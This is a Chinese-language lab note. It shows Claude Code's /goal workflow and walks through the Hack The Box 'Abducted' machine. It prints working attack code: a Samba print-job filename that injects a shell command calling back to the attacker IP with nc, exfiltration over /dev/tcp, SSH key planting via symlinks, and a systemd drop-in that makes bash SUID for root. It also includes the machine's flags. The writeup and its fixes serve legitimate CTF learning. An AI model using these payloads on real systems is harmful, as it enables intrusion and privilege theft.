---
title: HTB Abducted — goal 實戰案例
tags: [ai, 個人筆記, claude-code, goal, htb, 滲透測試, ctf]
created: 2026-06-08
---

# HTB Abducted — 案例筆記

> [!info]
> 本文涵蓋兩個主題：
> 1. **Claude Code `/goal` 指令的使用方式**（工作流程設計）
> 2. **HTB 題目解析與完整流程**（技術內容）

---

## 目錄

1. [Claude Code `/goal` 使用說明](#claude-code-goal-使用說明)
   - [什麼是 `/goal`](#什麼是-goal)
   - [本次使用的 CLAUDE.md](#本次使用的-claudemd)
   - [完整對話 Prompt 紀錄](#完整對話-prompt-紀錄)
   - [使用心得與注意事項](#使用心得與注意事項)
2. [HTB Abducted 題目解析](#htb-abducted-題目解析)
   - [題目資訊](#題目資訊)
   - [完整攻擊流程](#完整攻擊流程)
   - [Phase 1：偵察](#phase-1偵察)
   - [Phase 2：RCE — Samba Printaudit 注入](#phase-2rce--samba-printaudit-注入)
   - [Phase 3：橫向移動 — 憑證洩漏與 SMB 寬路徑](#phase-3橫向移動--憑證洩漏與-smb-寬路徑)
   - [Phase 4：提權 — systemd 服務 Drop-in 注入](#phase-4提權--systemd-服務-drop-in-注入)
   - [Flags](#flags)
   - [關鍵漏洞總結](#關鍵漏洞總結)

---

## Claude Code `/goal` 使用說明

### 什麼是 `/goal`

`/goal` 是 Claude Code 的 skill 指令，用來設定一個「有 Stop Hook 的工作目標」。

- **設定後 Claude 不能自行停止**，直到目標條件（stop condition）達成
- 條件達成後 Hook 自動解除，不需要手動 `/goal clear`
- 可以用 `/goal clear` 強制提前清除（但要在目標尚未完成時才需要）
- Token 預算可透過 `--tokens` 參數指定（例如 `--tokens 500K`）

**語法格式：**
```
/goal [--tokens <budget>]
<多行的目標描述與指示>
```

---

### 本次使用的 CLAUDE.md

放在工作目錄 `~/htb_abducted/CLAUDE.md`，Claude 啟動時會自動讀取：

```markdown
# CLAUDE.md

## Environment
- OS: Ubuntu (standard install, pentest tools may be missing)
- HTB VPN active on tun0
- My IP: 10.10.14.102
- Target IP: 10.129.11.250

## Tool installation policy
If any tool is not found, install it before proceeding:
- apt-based: sudo apt install -y <tool>
- Python: pip3 install <package>
- Go tools: go install <repo>@latest
- Binary releases: download from GitHub releases to /usr/local/bin/

## Logging rules
- Working directory: ~/htb/machine-name/
- All tool output: saved under ./recon/ using tee
- Notes and summaries: ./recon/notes.md
- Flag storage: ./recon/flags.txt
- Never run a command without capturing its output

## Tools to try
nmap, gobuster, ffuf, curl, whatweb, nikto, sqlmap,
netcat, pwncat-cs, python3, hydra

## Stop condition
Read local.txt → record to recon/flags.txt → STOP
Do not escalate privileges until next session
```

**CLAUDE.md 的作用：**
- 提供環境資訊（IP、VPN 狀態）
- 規定 logging 規則（所有輸出都要存檔）
- 設定 stop condition（避免 Claude 自行決定做更多）

---

### 完整對話 Prompt 紀錄

本次 session 橫跨兩個對話（因 context 用盡自動接續），以下按時間順序記錄所有 prompt，並標注當時的狀態與 Claude 的反應。

---

#### Session 1：偵察 → 取得 User Flag

---

**[1] 切換工作目錄**

```
cd htb_abducted
```

> 普通 shell 指令，讓 Claude 知道工作目錄。

---

**[2] 設定 Goal 1：取得 User Flag（500K tokens）**

```
/goal --tokens 500K
Target: 10.129.11.250
My IP: 10.10.14.102 (tun0)

Environment: Ubuntu (standard install, pentest tools may be missing)
- If a tool is missing, install it first:
    sudo apt install -y nmap gobuster curl netcat-traditional python3 python3-pip whatweb nikto
    pip3 install pwncat-cs
    sudo apt install -y ffuf

Logging rules (STRICT):
- All commands piped through tee to ./recon/
- Example: nmap ... | tee recon/nmap_full.txt
- Phase summaries appended to recon/notes.md
- Flag saved to recon/flags.txt

Objective: Obtain user-level access and read local.txt
Stop after retrieving local.txt — do NOT attempt privilege escalation yet.

Phase 1 - Recon:
  - nmap -sC -sV -p- 10.129.11.250 | tee recon/nmap_full.txt
  - identify open services and versions
  - if HTTP found: enumerate dirs with gobuster/ffuf, check robots.txt, page source
  - save web findings to recon/web_enum.txt

Phase 2 - Foothold:
  - research identified services for known vulns or misconfigs
  - attempt exploitation (SQLi, SSTI, LFI, RCE, default creds, etc.)
  - log all attempts to recon/exploit_attempts.txt
  - goal: shell as any non-root user

Phase 3 - Read flag:
  - locate local.txt under /home/*/ or user home
  - cat local.txt and save to recon/flags.txt
  - report flag content and STOP

Append a summary to recon/notes.md at the end of each phase.
```

> **Stop Hook 啟動。** Claude 開始執行 nmap、SMB 枚舉、發現 printaudit 注入點、建立 RCE。

---

**[3] 確認連線狀態**

```
現在還連在線上嗎?
```

> Claude 確認 RCE channel 仍然有效，繼續偵察。

---

**[4] 請求暫停**

```
可以先暫停一下嗎?
```

> **Stop Hook 阻擋停止。** Claude 回應：因為 stop hook 啟用，在 local.txt 未讀取並存入 flags.txt 前無法停止，但可以先整理目前的發現。  
> *（此時 Claude 繼續工作中，context 接近上限，對話自動壓縮並接續到 Session 2）*

---

#### Session 2：繼續偵察 → 取得 Flag → 提權

---

**[5] 清除 Goal（中途重設）**

```
/goal clear
```

> 清除第一個 goal 的 stop hook。Claude 回應說明 goal clear 後可以繼續工作或重新設定目標。

---

**[6] 請求整理資料**

```
先暫停一下, 並整理現在有的資料和結果
```

> Claude 整理所有已知資訊並寫入 `recon/notes.md`，列出攻擊路徑優先順序：
> 1. 解碼 rclone 密碼 → 連線備份 SFTP
> 2. 繼續 SSH brute force（scott / marcus）
> 3. SMB wide links 利用（需要 scott 憑證）

---

**[7] 詢問 goal clear 的影響**

```
如果下了 goal clear 可以接續嗎?
```

> Claude 回答：`/goal clear` 只移除 stop hook 限制，不影響已做的工作或 recon 資料，清除後可以直接繼續或重新設 `/goal`。

---

**[8] 具體操作指令：停止 brute force、找 local.txt、寫 writeup**

```
先拿掉 SSH brute force, 既然可以 RCE, 找找看有沒有 local.txt, 並先把 RCE 的部分寫到 writeup 裡面
繼續做做看
```

> Claude 執行：
> 1. `kill` 所有 hydra 進程
> 2. 用 RCE 對目標執行 `find / -name "local.txt"` → 找不到（flag 在鎖定目錄）
> 3. 改為解碼 rclone 密碼 → 得到 `iXzvcib3SrpZ`
> 4. 嘗試 SSH → **scott 登入成功**，取得 `user.txt`
> 5. 將 RCE 技術細節寫入 `writeup.md`

---

**[9] 詢問提權路徑（以使用者身份）**

```
可以先幫我檢查可能的提權嗎?
```

> Claude 用 scott 和 marcus 的 SSH 存取做完整枚舉，報告所有發現：
> - `operators` 群組擁有 `/etc/systemd/system/smbd.service.d/`（**首要路徑**）
> - rclone cron 每天 02:30 以 root 執行，source 目錄可寫（次要路徑）
> - SUID 二進位都是標準，sudo 無特別規則
> - 分析卡點：如何觸發 smbd 重啟

---

**[10] 設定 Goal 2：提權至 root（50K tokens）**

```
/goal --tokens 50K
Target: 10.129.11.250
My IP: 10.10.14.102
Already have: user shell

Objective: Escalate privileges to root and read proof.txt (usually at /root/proof.txt)

Phase 1 - Local enumeration (quick):
  - whoami, id, uname -a | tee recon/privesc_enum.txt
  - sudo -l
  - find SUID binaries: find / -perm -4000 2>/dev/null | tee recon/suid.txt
  - check cron: cat /etc/crontab, ls /etc/cron*
  - check writable paths and interesting files
  - run linpeas.sh if needed (download from github to /tmp/)

Phase 2 - Exploit:
  - identify the most promising privesc vector
  - exploit it to get root shell
  - log steps to recon/privesc_notes.md

Phase 3 - Read flag:
  - cat /root/proof.txt | tee recon/flags.txt
  - report flag and STOP
```

> **Stop Hook 再次啟動。** Claude 測試 `systemctl daemon-reload` 和 `systemctl restart smbd` 作為 marcus → 兩者都 exit 0。  
> 寫入惡意 drop-in → 重啟 smbd → `/bin/bash` 變 SUID → `euid=0` → 讀取 `/root/root.txt`。  
> **Flag 存入 `recon/flags.txt`，Stop Hook 自動解除。**

---

**[11] 要求補充所有 prompt 至筆記**

```
Prompt 除了 goal 還有其他的也全部加進去
```

> 即本次更新。

---

### Prompt 時序總覽

```
[1] cd htb_abducted                          ← 切換目錄
[2] /goal --tokens 500K ...                  ← Goal 1 啟動（user flag）
[3] 現在還連在線上嗎?                          ← 狀態確認
[4] 可以先暫停一下嗎?                          ← Stop hook 阻擋，繼續工作
─── Context 壓縮，Session 接續 ───
[5] /goal clear                              ← 清除 Goal 1
[6] 先暫停一下，並整理現在有的資料和結果         ← 請求彙整
[7] 如果下了 goal clear 可以接續嗎?            ← 機制確認
[8] 先拿掉 SSH brute force...繼續做做看        ← 具體操作指令
[9] 可以先幫我檢查可能的提權嗎?                 ← 提權枚舉
[10] /goal --tokens 50K ...                  ← Goal 2 啟動（root flag）
[11] Prompt 除了 goal 還有其他的也全部加進去    ← 本次更新
[12] 可以將使用時間和使用 token 也加進去        ← 本節更新
```

---

### 時間與 Token 使用記錄

#### 工作時間軸（2026-06-08，時區 CST UTC+8）

從各工具輸出與 recon 檔案的 mtime 重建：

| 時間 | 事件 | 對應檔案 |
|------|------|---------|
| **17:13** | nmap 掃描開始，Goal 1 啟動 | `nmap_full.txt` |
| **17:14** | nmap 完成，確認 22 / 139 / 445 開放 | `nmap_full.txt` |
| **17:15** | SMB 枚舉（shares、users、RPC） | `smb_shares.txt` ... |
| **17:17** | SMB share 細節確認完成 | `smb_shares_detail.txt` |
| **17:24** | 首次 SSH brute force（短字典，43 筆） | `ssh_brute.txt` |
| **17:26** | 首次 brute force 結束，無結果 | `ssh_brute.txt` |
| **17:28** | RPC 枚舉完成 | `rpc_full_enum.txt` |
| **17:36** | SMB guest 存取深入探索 | `smb_guest_access.txt` |
| **17:54** | RCE 嘗試記錄（printaudit 注入成功） | `exploit_attempts.txt` |
| **17:30–18:40** | 擴充字典 SSH brute（scott，2542 筆） | `ssh_brute2.txt` |
| **18:18** | 開始 marcus SSH brute | `smb_brute.txt` |
| **18:40** | scott brute force 結束，無結果 | `ssh_brute2.txt` |
| **~18:50** | 收到「先拿掉 brute force」指令 | — |
| **~18:55** | Kill hydra；解碼 rclone 密碼；SSH as scott 成功 | — |
| **~19:00** | 取得 **user flag** `c1639ee77459c3d139c7419a7caa42ea` | `flags.txt` |
| **19:09** | 以 scott 開始提權枚舉 | `privesc_enum.txt` |
| **19:12** | 植入 marcus SSH key，以 marcus 枚舉 | `privesc_marcus.txt` |
| **~19:30** | 發現 smbd.service.d 可寫 | — |
| **~20:35** | 確認 marcus 可執行 systemctl restart smbd | — |
| **20:41** | 寫入 drop-in → 重啟 smbd → bash SUID → 取得 **root flag** | `flags.txt` |

**總時間：約 3 小時 28 分**（17:13 → 20:41）

#### 各階段耗時

| 階段 | 時間區間 | 耗時 | 備註 |
|------|---------|------|------|
| Recon（nmap + SMB 枚舉） | 17:13–17:17 | ~4 min | 快速 |
| RCE 發現與確認 | 17:17–17:54 | ~37 min | 包含多次嘗試（PostScript、SambaCry 等死路） |
| SSH Brute Force（等待中） | 17:24–18:40 | ~76 min | 最終無效，應提早放棄 |
| rclone 憑證解碼 → scott | ~18:50–19:00 | ~10 min | 快速突破 |
| marcus 橫向移動 | 19:00–19:12 | ~12 min | SMB wide links + SSH key 植入 |
| 提權枚舉 | 19:12–20:35 | ~83 min | 包含排查多個假路徑 |
| 提權執行 → root | ~20:35–20:41 | ~6 min | drop-in 寫入到 flag 不到 6 分鐘 |

> **最大時間浪費**：SSH brute force 跑了 76 分鐘最終無效。已知 RCE 後應優先讀取設定檔找憑證，而非暴力破解。

#### Token 使用估計

> **注意**：Claude Code 目前不在 session 內提供精確的 token 消耗數字，以下為估計值與預算設定紀錄。

| Goal | 設定預算 | 估計消耗 | 備註 |
|------|---------|---------|------|
| Goal 1（user flag） | 500K tokens | 高（觸發 context 壓縮） | Session context 被壓縮一次，代表單次對話 context 已接近上限（約 200K tokens） |
| Goal 2（root flag） | 50K tokens | 低–中（未觸發壓縮） | 方向明確，枚舉與利用都較集中 |

**Context 壓縮的意義**：
- 對話 context 被壓縮表示本次工作量約等於 **1–2 個完整 context window**
- 壓縮後工作可無縫繼續，但 Claude 重建狀態時依賴 summary，細節可能有遺失
- 若想避免壓縮，可以更頻繁地 `/goal clear` 分段、或縮小每段目標的範圍

#### 效率回顧與改進建議

| 決策 | 實際結果 | 下次建議 |
|------|---------|---------|
| 同時跑 SSH brute force + 繼續 RCE 枚舉 | Brute force 耗時 76 min 無結果 | 有 RCE 後先讀設定檔找憑證，brute force 作為背景保險即可，不要等它 |
| Goal 1 設 500K tokens | Context 被壓縮，說明工作量超過單一 context | 可考慮 300K 較保守，或分成更細的階段 goal |
| Goal 2 設 50K tokens | 足夠，未觸發壓縮 | 50K 對提權階段是合理值 |
| 提權枚舉耗 83 min | 包含找尋 smbd 重啟方法的迂迴 | 遇到「明顯的 intended path」（如 writable service drop-in）時，應優先直接測試是否可 restart，而非先窮舉其他路徑 |

---

### 使用心得與注意事項

| 面向 | 心得 |
|------|------|
| **Stop Hook 的意義** | 防止 Claude 在未達成目標時自行結束對話或切換話題；對長時間 pentest 工作流程非常有用 |
| **分段 goal** | User flag 和 root flag 分開設定，避免 Claude 在拿到 user flag 後自行決定繼續提權；用 CLAUDE.md 的 stop condition 也能達到相同效果 |
| **Token 預算** | 用 `--tokens` 控制每個階段的消耗；已知方向的提權用 50K 就夠，完整偵察用 500K |
| **CLAUDE.md 的重要性** | 提前寫好 logging 規則和 stop condition，Claude 就會自動遵守；不用每次都在 prompt 裡重複說明 |
| **中途暫停** | 說「先暫停」Claude 不會直接停（因為 stop hook 啟用）；需要 `/goal clear` 才能強制清除 |
| **goal clear 的時機** | 重設目標或提前結束時用；成功達成後 stop hook 自動解除，不需要手動 clear |
| **自然語言指令** | `/goal` 以外的普通對話依然有效；可以在 goal 執行中間插入具體指令（如「先拿掉 brute force」），Claude 會優先執行再繼續目標 |
| **context 壓縮接續** | 對話 context 滿了會自動壓縮繼續，不需要手動管理；但 goal 的 stop hook 會被保留 |
| **機制確認可以直接問** | 不確定 `/goal clear` 會不會影響進度，直接問 Claude 即可；不用自己去查文件 |

---

## HTB Abducted 題目解析

### 題目資訊

| 項目 | 內容 |
|------|------|
| **Target IP** | 10.129.11.250 |
| **Attacker IP** | 10.10.14.102 (tun0) |
| **OS** | Ubuntu 24.04.4 LTS |
| **Kernel** | 6.8.0-124-generic |
| **Samba** | 4.19.5-Ubuntu |
| **User Flag** | `c1639ee77459c3d139c7419a7caa42ea` |
| **Root Flag** | `918942b71f69e82a824604d6a84f42ef` |

---

### 完整攻擊流程

```
nmap → SMB 枚舉
    ↓
HP-Reception 印表機 Share (guest ok)
    ↓
Samba %J 巨集展開 → printaudit shell 注入
    ↓
RCE as nobody (uid=65534)
    ↓
讀 /opt/offsite-backup/rclone.conf (world-readable)
    ↓
rclone obscured password → reveal → iXzvcib3SrpZ
    ↓
SSH as scott (密碼重用)
    ↓
SMB transfer share (wide links + force user=marcus)
    ↓
建立 symlink → 植入 marcus 的 SSH authorized_keys
    ↓
SSH as marcus (自己的 key)
    ↓
operators group → 寫入 /etc/systemd/system/smbd.service.d/
    ↓
惡意 drop-in: ExecStartPre=chmod +s /bin/bash
    ↓
systemctl daemon-reload && systemctl restart smbd
    ↓
/bin/bash -p → euid=0 (root)
    ↓
cat /root/root.txt → FLAG ✓
```

---

### Phase 1：偵察

#### nmap 結果

```bash
nmap -sC -sV -p- 10.129.11.250
```

開放 Port：
- **22** — OpenSSH
- **139, 445** — Samba SMB

#### SMB 枚舉

```bash
smbclient -L //10.129.11.250 -N
```

發現三個 Share：

| Share | 描述 | 關鍵設定 |
|-------|------|----------|
| `HP-Reception` | 印表機 share | `guest ok = yes`, `print command = /usr/local/bin/printaudit %J %s` |
| `projects` | 專案檔案 | `valid users = scott` |
| `transfer` | 員工傳輸 | `valid users = scott`, `force user = marcus`, `wide links = yes` |

---

### Phase 2：RCE — Samba Printaudit 注入

#### 漏洞原理

`/etc/samba/shares.conf` 的印表機設定：

```ini
[HP-Reception]
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
```

`/usr/local/bin/printaudit`：

```sh
#!/bin/sh
echo "$(date '+%Y-%m-%d %H:%M:%S') job=$1" >> /var/log/printaudit.log
```

**漏洞點：** Samba 在呼叫 print command 前，會將 `%J`（job name = SMB 上傳的檔名）展開並直接傳給 shell。因為 `%J` **沒有加引號**，檔名中的特殊字元（如 `|`）會被 shell 解析為管線語法。

**Shell 實際執行：**

```sh
# 檔名 = |nc 10.10.14.102 4444|bash|.ps
/usr/local/bin/printaudit |nc 10.10.14.102 4444|bash|.ps /var/spool/samba/tmpfile

# Shell 解析成：
/usr/local/bin/printaudit  |  nc 10.10.14.102 4444  |  bash  |  .ps ...
```

結果：目標上的 `bash` 從我們的 nc 讀取指令 → **RCE as nobody**

#### 利用工具

標準 smbclient 會跳脫特殊字元，所以用 impacket 直接建立含特殊字元的檔名：

```python
# /tmp/chain_upload.py
from impacket.smbconnection import SMBConnection
import time

TARGET = "10.129.11.250"
conn = SMBConnection(TARGET, TARGET, sess_port=445)
conn.login("", "")                          # guest 登入
tid = conn.connectTree("HP-Reception")
time.sleep(3)

fname = '|nc 10.10.14.102 4444|bash|.ps'
fid = conn.createFile(tid, fname)
conn.writeFile(tid, fid, b"x")
conn.closeFile(tid, fid)
print(f"[+] Uploaded: {fname}")
conn.close()
```

#### 指令回傳方式

bash 的 stdout 被 pipe 到不存在的 `.ps` 指令，所以輸出不會回來。用 `/dev/tcp` 另開一條連線：

```bash
# 攻擊端：啟動監聽
nc -nlvp 5555 > /tmp/output.txt

# 透過 bash channel 送出（寫入 named pipe）
exec 5>/dev/tcp/10.10.14.102/5555; id >&5
```

#### Named Pipe 完整設定

```bash
# 攻擊端
mkfifo /tmp/cmd_pipe
tail -f /tmp/cmd_pipe | nc -nlvp 4444 &   # bash channel
nc -nlvp 5555 > /tmp/output.txt &          # 輸出接收

# 觸發 exploit
python3 /tmp/chain_upload.py

# 送指令
echo 'exec 5>/dev/tcp/10.10.14.102/5555; cat /etc/passwd >&5' > /tmp/cmd_pipe
```

---

### Phase 3：橫向移動 — 憑證洩漏與 SMB 寬路徑

#### 3.1 rclone 憑證洩漏

透過 RCE 讀取 world-readable 設定檔：

```bash
cat /opt/offsite-backup/rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

**重點：** rclone 的 `pass` 欄位使用 reversible obfuscation（不是真正加密），可直接解碼：

```bash
rclone reveal "HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw"
# → iXzvcib3SrpZ
```

#### 3.2 密碼重用 → scott SSH

解碼後的密碼在 scott 的 SSH 登入有效（密碼重用）：

```bash
sshpass -p 'iXzvcib3SrpZ' ssh scott@10.129.11.250
# uid=1000(scott)
```

**User flag：**

```bash
cat /home/scott/user.txt
# c1639ee77459c3d139c7419a7caa42ea
```

#### 3.3 SMB Wide Links → marcus SSH Key 植入

`transfer` share 的設定：
```ini
[transfer]
   valid users = scott
   force user = marcus      ← 所有操作以 marcus 身份執行
   wide links = yes         ← 允許 symlink 指向 share 根目錄之外
```

**攻擊步驟：**

```bash
# 1. 以 scott 身份在 transfer share 建立指向 marcus home 的 symlink
ln -s /home/marcus /srv/transfer/marcus_home

# 2. 透過 SMB 確認 symlink 可以跟隨（以 marcus 身份執行）
smbclient //10.129.11.250/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'cd marcus_home; ls'
# → 可以看到 marcus 的 home 內容

# 3. 建立 .ssh 目錄（marcus 還沒有）
smbclient //10.129.11.250/transfer -U 'scott%iXzvcib3SrpZ' \
  -c 'cd marcus_home; mkdir .ssh'

# 4. 生成 SSH keypair
ssh-keygen -t ed25519 -f /tmp/marcus_key -N ""

# 5. 上傳 authorized_keys（寫入動作以 marcus 身份執行）
smbclient //10.129.11.250/transfer -U 'scott%iXzvcib3SrpZ' \
  -c "cd marcus_home; cd .ssh; put /tmp/marcus_key.pub authorized_keys"

# 6. 以 marcus 身份 SSH 登入
ssh -i /tmp/marcus_key marcus@10.129.11.250
# uid=1001(marcus) groups=1002(marcus),1000(operators)
```

---

### Phase 4：提權 — systemd 服務 Drop-in 注入

#### 發現

marcus 屬於 `operators` 群組（gid=1000），而 smbd 的 systemd drop-in 目錄由此群組擁有：

```bash
ls -la /etc/systemd/system/smbd.service.d/
# drwxrws--- 2 root operators 4096 /etc/systemd/system/smbd.service.d/
```

- `drwxrws---`：setgid + group writable → operators 成員可以寫入
- marcus 在 operators 群組 → **可寫入 smbd.service.d/**

**額外發現：** marcus 可以直接執行 `systemctl daemon-reload` 和 `systemctl restart smbd`，不需要密碼（polkit/D-Bus 政策允許 operators 群組管理 smbd）。

#### 利用

```bash
# 1. 以 marcus 身份寫入惡意 drop-in
cat > /etc/systemd/system/smbd.service.d/privesc.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c "chmod u+s /bin/bash"
EOF

# 2. 重新載入 systemd 設定並重啟 smbd
#    ExecStartPre 在 smbd 啟動前以 root 執行
systemctl daemon-reload
systemctl restart smbd

# 3. 確認 /bin/bash 已變成 SUID
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1446024 /bin/bash

# 4. 取得 root shell
/bin/bash -p -c "id"
# uid=1001(marcus) gid=1002(marcus) euid=0(root)

# 5. 讀取 root flag
/bin/bash -p -c "cat /root/root.txt"
# 918942b71f69e82a824604d6a84f42ef
```

#### 為什麼 marcus 可以重啟 smbd？

smbd.service.d/ 設計為讓 operators 群組寫入，同時 D-Bus/polkit 政策也允許 operators 管理 smbd 服務。這兩個設定互相配合，形成完整的提權路徑——這是題目設計者刻意安排的 intended path。

---

### Flags

| Flag | 值 | 位置 |
|------|-----|------|
| **User** | `c1639ee77459c3d139c7419a7caa42ea` | `/home/scott/user.txt` |
| **Root** | `918942b71f69e82a824604d6a84f42ef` | `/root/root.txt` |

---

### 關鍵漏洞總結

| # | 漏洞 | 類型 | 影響 |
|---|------|------|------|
| 1 | Samba `%J` 巨集不加引號展開 | Shell Injection | RCE as nobody |
| 2 | rclone `pass` 欄位 reversible obfuscation + world-readable 設定檔 | 憑證洩漏 | 明文密碼 |
| 3 | 密碼重用（rclone 備份帳號 = 系統使用者密碼） | 密碼重用 | scott SSH 登入 |
| 4 | Samba `wide links = yes` + `force user = marcus` | 任意讀寫 | 以 marcus 身份存取任意路徑 |
| 5 | operators 群組可寫入 smbd.service.d/ + 可重啟 smbd | systemd Drop-in 注入 | root 提權 |

#### 修補建議

1. **printaudit**：引號包住 `%J` → `"/usr/local/bin/printaudit '%J' %s"`
2. **rclone.conf**：改為 600 權限（僅 root 可讀）；使用真正的加密方案
3. **密碼管理**：備份服務帳號不應與系統使用者共用密碼
4. **Samba wide links**：生產環境不應啟用 `wide links = yes`；若需要，搭配 `unix extensions = no` 仍不足夠
5. **systemd 權限**：限制 operators 群組只能 reload config（`ExecReload`），不應能完整 restart 服務

---

## 附錄：偵察工作流程參考

```bash
# 資料夾結構
htb_abducted/
├── CLAUDE.md              # 環境設定與規則
├── writeup.md             # 完整 writeup
└── recon/
    ├── nmap_full.txt      # 完整 port scan
    ├── smb_shares.txt     # SMB share 列表
    ├── notes.md           # 各階段摘要筆記
    ├── privesc_notes.md   # 提權步驟記錄
    └── flags.txt          # Flag 存檔
```

```bash
# 常用指令快速參考（本次用到的）

# SMB 枚舉
smbclient -L //TARGET -N
smbmap -H TARGET

# rclone 解碼
rclone reveal "<obscured_password>"

# SMB wide links 利用
smbclient //TARGET/share -U 'user%pass' -c 'cd symlink_dir; ls'
smbclient //TARGET/share -U 'user%pass' -c "put localfile remotepath"

# systemd drop-in 提權
echo '[Service]
ExecStartPre=/bin/bash -c "chmod u+s /bin/bash"' \
  > /etc/systemd/system/SERVICE.service.d/privesc.conf
systemctl daemon-reload && systemctl restart SERVICE
/bin/bash -p
```
